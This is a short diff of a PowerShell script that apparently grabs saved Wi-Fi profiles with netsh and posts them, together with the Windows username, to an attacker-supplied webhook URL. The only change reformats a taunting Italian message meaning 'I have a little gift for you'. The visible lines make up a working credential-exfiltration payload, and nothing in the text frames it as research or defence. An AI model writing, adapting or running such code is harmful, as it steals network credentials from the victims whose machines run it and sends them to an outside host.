@@ -10,7 +10,7 @@ $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 $hookurl = "$dc"
 $Body = @{
   'username' = $env:username 
-  'content' = "Ciao! `n Ho un regalino per te :) `n $wifiProfiles_IT $wifiProfiles_EN "
+  'content' = "Ciao! `n Ho un regalino per te :) $wifiProfiles_IT $wifiProfiles_EN `n "
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
